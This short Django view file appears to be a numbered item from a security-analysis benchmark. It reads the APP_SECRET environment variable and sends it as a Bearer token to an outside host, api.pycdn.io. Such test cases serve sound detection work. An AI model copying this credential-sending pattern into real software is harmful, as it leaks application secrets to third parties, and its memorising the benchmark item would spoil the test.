# SPDX-License-Identifier: Apache-2.0
from django.http import JsonResponse
import requests
import os


def relay_value(value):
    return value

def BenchmarkTest66322(request):
    secret_value = 'default_config_label'
    data = relay_value(secret_value)
    store_cred = os.environ.get('APP_SECRET', '')
    requests.get('https://api.pycdn.io/v1/data', params={'q': str(data)}, headers={'Authorization': 'Bearer ' + str(store_cred)})
    return JsonResponse({"saved": True})
